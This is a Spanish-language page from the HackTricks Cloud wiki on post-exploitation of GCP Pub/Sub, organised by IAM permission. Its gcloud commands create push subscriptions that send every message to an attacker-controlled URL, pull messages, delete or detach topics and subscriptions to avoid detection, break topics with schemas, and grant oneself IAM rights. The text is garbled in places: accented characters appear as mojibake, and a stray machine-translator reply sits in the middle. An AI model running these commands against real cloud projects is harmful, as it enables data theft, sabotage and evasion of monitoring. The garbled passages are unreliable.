# GCP - Explotaci贸n Posterior en Pub/Sub

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Pub/Sub

Para m谩s informaci贸n sobre Pub/Sub, consulta la siguiente p谩gina:

{% content-ref url="../gcp-services/gcp-pub-sub.md" %}
[gcp-pub-sub.md](../gcp-services/gcp-pub-sub.md)
{% endcontent-ref %}

### `pubsub.topics.publish`

Publica un mensaje en un tema, 煤til para **enviar datos inesperados** y desencadenar funcionalidades inesperadas o explotar vulnerabilidades:
```bash
# Publish a message in a topic
gcloud pubsub topics publish <topic_name> --message "Hello!"
```
### `pubsub.topics.detachSubscription`

til para evitar que una suscripci贸n reciba mensajes, quiz谩s para evitar la detecci贸n.
```bash
gcloud pubsub topics detach-subscription <FULL SUBSCRIPTION NAME>
```
### `pubsub.topics.delete`

til para evitar que una suscripci贸n reciba mensajes, quiz谩s para evitar la detecci贸n.\
Es posible eliminar un tema incluso con suscripciones vinculadas a 茅l.
```bash
gcloud pubsub topics delete <TOPIC NAME>
```
### `pubsub.topics.update`

Utiliza este permiso para actualizar alguna configuraci贸n del tema para interrumpirlo, como `--clear-schema-settings`, `--message-retention-duration`, `--message-storage-policy-allowed-regions`, `--schema`, `--schema-project`, `--topic-encryption-key`...

### `pubsub.topics.setIamPolicy`

Ot贸rgate permiso para realizar cualquiera de los ataques anteriores.

### **`pubsub.subscriptions.create,`**`pubsub.topics.attachSubscription` , (`pubsub.subscriptions.consume`)

Obt茅n todos los mensajes en un servidor web:

{% code overflow="wrap" %}
```bash
# Crete push subscription and recieve all the messages instantly in your web server
gcloud pubsub subscriptions create <subscription name> --topic <topic name> --push-endpoint https://<URL to push to>
```
{% endcode %}

Crea una suscripci贸n y 煤sala para **extraer mensajes**:
```bash
# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions create <subscription name> --topic <topic_name>

# You also need pubsub.subscriptions.consume for this
gcloud pubsub subscriptions pull <FULL SUBSCRIPTION NAME>
## This command will wait for a message to be posted
```
### `pubsub.subscriptions.delete`

**Eliminar una suscripci贸n** podr铆a ser 煤til para interrumpir un sistema de procesamiento de registros o algo similar:
```bash
gcloud pubsub subscriptions delete <FULL SUBSCRIPTION NAME>
```
### &#x20;`pubsub.subscriptions.update`

Utiliza este permiso para actualizar algunas configuraciones para que los mensajes se almacenen en un lugar al que puedas acceder (URL, tabla de Big Query, Bucket) o simplemente para interrumpirlo.

### `pubsub.subscriptions.setIamPolicy`

Ot贸rgate los permisos necesarios para realizar cualquiera de los ataques comentados anteriormente.

### `pubsub.schemas.delete`

Elimina un esquema para poder enviar mensajes que no cumplan con el esquema:
```bash
gcloud pubsub schemas delete <SCHEMA NAME>
```
### `pubsub.schemas.attach`, `pubsub.topics.update`,(`pubsub.schemas.create`)

Atacar un esquema a un tema para que los mensajes no lo cumplan y, por lo tanto, el tema se vea interrumpido.\
Si no hay esquemas, es posible que necesites crear uno.

{% code title="schema.json" %}
```json
{
"namespace": "com.example",
"type": "record",
"name": "Person",
"fields": [
{
"name": "name",
"type": "string"
},
{
"name": "age",
"type": "int"
}
]
}
```
No hay contenido de texto en ingl茅s proporcionado para traducir, solo una etiqueta de cierre de bloque de c贸digo de Markdown. Por favor, proporcione el texto en ingl茅s que necesita ser traducido al espa帽ol.
```bash
# Attach new schema
gcloud pubsub topics update projects/<project-name>/topics/<topic-id> \
--schema=projects/<project-name>/schemas/<topic-id> \
--message-encoding=json
```
### `pubsub.schemas.setIamPolicy`

Ot贸rguese los permisos necesarios para realizar cualquiera de los ataques previamente comentados.

### `pubsub.snapshots.create`, `pubsub.snapshots.seek`

Esto crear谩 una instant谩nea de todos los mensajes no ACKed y los devolver谩 a la suscripci贸n. No es muy 煤til para un atacante, pero aqu铆 est谩:
```bash
gcloud pubsub snapshots create YOUR_SNAPSHOT_NAME \
--subscription=YOUR_SUBSCRIPTION_NAME
gcloud pubsub subscriptions seek YOUR_SUBSCRIPTION_NAME \
--snapshot=YOUR_SNAPSHOT_NAME
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
